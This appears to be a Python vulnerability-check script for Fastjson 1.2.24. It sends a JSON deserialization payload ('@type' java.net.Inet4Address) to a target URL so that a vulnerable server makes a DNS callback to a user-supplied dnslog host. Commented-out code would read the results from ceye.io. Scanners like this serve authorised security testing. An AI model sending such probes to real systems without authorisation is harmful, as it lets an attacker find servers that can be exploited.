import requests
import re
import time
import argparse



def CheckForVulnerabilities(target,dnslog):
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0',
        'Content-Type': 'application/json',
        'Accept-Encoding': "gzip, deflate",
        'Connection': "close",
        'Accept': "*/*",
    }  # 设置请求头
    payload = '{"ceye":{"@type":"java.net.Inet4Address","val":"%s"}}' %dnslog   # 设置payload

    try:
        send = requests.post(url=target, headers=headers, data=payload, verify=False)     # 发送payload
        print("[+]Payload sent successfully!")
    except Exception as e:
        print(e)
    # 以下可以用来检测发送成功后ceye dnslog是否接受到连接,但仅限于辅助,尽量人工确认
    # time.sleep(3)
    # try:
    #     print("[+]Please go to the DNS platform to view the results")
    #     # checkDnslog = requests.get('http://api.ceye.io/v1/records?token=[token]&type=dns&filter=', headers=headers)
    #     # # reCeyeDnsLog = r'"remote_addr": "[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}"'
    #     # # print(re.findall(reCeyeDnsLog, checkDnslog.text))
    # except Exception as checkDnslogE:
    #     print(checkDnslogE)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(prog='FastJson1.2.24 check',
                                     description='python3 FastJson1.2.24_check.py -u target')
    parser.add_argument('-u', '--url', type=str, help='漏洞地址')
    parser.add_argument('-d', '--dnslogUrl', type=str, help='dnslog地址')
    args = parser.parse_args()
    target = args.url
    dnslog = args.dnslogUrl
    checkIsFastjson = requests.post(target, verify=False)
    if len(re.findall('fastjsondemo+', checkIsFastjson.text)) == 0:
        print('The website is not using the fastjson framework')
    else:
        CheckForVulnerabilities(target, dnslog)